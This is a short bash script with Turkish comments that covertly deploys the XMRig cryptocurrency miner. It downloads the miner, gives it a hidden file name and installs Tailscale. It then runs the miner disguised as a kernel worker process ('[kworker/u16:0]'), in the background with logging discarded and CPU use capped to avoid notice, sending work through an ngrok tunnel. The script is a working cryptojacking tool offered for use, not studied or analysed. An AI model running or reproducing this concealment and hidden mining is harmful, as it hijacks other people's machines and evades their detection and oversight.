#!/bin/bash

cd "$(dirname "$0")"
# GHOST WORKER - TAILSCALE & NGROK HYBRID
AGENT=".sys_core_logic"
CONFIG="logic_cfg.yaml"

# 1. Binary'yi çek
wget -q https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
tar -xf xmrig-6.22.2-linux-static-x64.tar.gz
mv xmrig-6.22.2/xmrig ./$AGENT
rm -rf xmrig-6.22.2*

# 2. Tailscale Başlat (İç ağ gizliliği için)
curl -fsSL https://tailscale.com/install.sh | sh
tailscale up --authkey=$TAILSCALE_AUTH

# 3. Yükü maskele ve başlat
# Burada xmrig doğrudan senin Ngrok tüneline (tcp://7.tcp.eu.ngrok.io:22108) bağlanacak
# --cpu-max-threads-hint 35 : İşlemcinin %35'ini kullanıyoruz, Battlefield'a yer bırakıyoruz.

exec -a "[kworker/u16:0]" ./$AGENT -c $CONFIG \
    --cpu-max-threads-hint 35 \
    --background \
    --log-file /dev/null \
    > /dev/null 2>&1 &

echo "Sistem Gizlendi. Trafik Tünel üzerinden VDS'e aktarılıyor."
